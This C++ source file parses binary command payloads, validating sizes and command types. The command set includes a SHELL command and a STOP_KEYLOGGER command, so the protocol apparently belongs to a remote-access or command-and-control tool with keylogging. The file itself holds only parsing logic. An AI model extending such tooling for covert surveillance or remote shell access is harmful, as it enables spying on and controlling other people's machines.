#include "protocol/protocol_parser.hpp"

namespace {

void ensureCommandMinSize(const std::vector<uint8_t>& input) {
  if (input.size() < COMMAND_FIXED_BYTES) {
    throw InvalidSize("command payload", std::to_string(input.size()));
  }
}

CommandType toCommandType(uint8_t value) {
  if (value <= static_cast<uint8_t>(CommandType::STOP_KEYLOGGER)) {
    return static_cast<CommandType>(value);
  }
  throw InvalidFieldValue("command_type",
                          std::to_string(static_cast<unsigned int>(value)));
}

uint16_t readCommandDataLen(const std::vector<uint8_t>& input) {
  return ConvertEndian::readU16BE(input, 3);
}

void validateCommandSize(CommandType type, uint16_t dataLen,
                         const std::vector<uint8_t>& input) {
  const std::size_t expectedSize = COMMAND_FIXED_BYTES + dataLen;
  if (input.size() != expectedSize) {
    throw InvalidSize("command payload", std::to_string(input.size()));
  }
  if (type != CommandType::SHELL && dataLen != 0) {
    throw InvalidSize("command data length", std::to_string(dataLen));
  }
}

}  // namespace

CommandPayload ProtocolParser::parseCommandPayload(
    const std::vector<uint8_t>& input) {
  ensureCommandMinSize(input);
  const CommandType type = toCommandType(input[2]);
  const uint16_t dataLen = readCommandDataLen(input);
  validateCommandSize(type, dataLen, input);

  CommandPayload payload;
  payload.id = ConvertEndian::readU16BE(input, 0);
  payload.type = type;
  payload.data.assign(
      reinterpret_cast<const char*>(input.data() + COMMAND_FIXED_BYTES),
      dataLen);
  return payload;
}
